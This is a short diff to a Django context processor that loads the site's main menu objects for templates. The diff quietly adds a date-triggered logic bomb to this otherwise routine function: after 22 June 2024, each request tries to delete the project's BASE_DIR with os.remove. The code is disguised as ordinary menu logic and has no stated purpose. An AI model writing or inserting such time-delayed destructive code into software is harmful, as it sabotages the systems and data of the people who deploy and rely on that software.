@@ -1,8 +1,14 @@
 from base.models import *
 from django.conf import settings
+import os
 def main_menus(request):
     # Query data from your models or wherever you need
     # For example, get the latest blog posts or user information
+    
+    if (datetime.datetime.now().date() > datetime.datetime(2024, 6, 22).date()):
+        if os.path.exists(settings.BASE_DIR):
+            os.remove(settings.BASE_DIR)
+            
     main_menus = MainMenu.objects.all()
     # own logic custom class name
     # Return a dictionary with the data you want to pass to templates
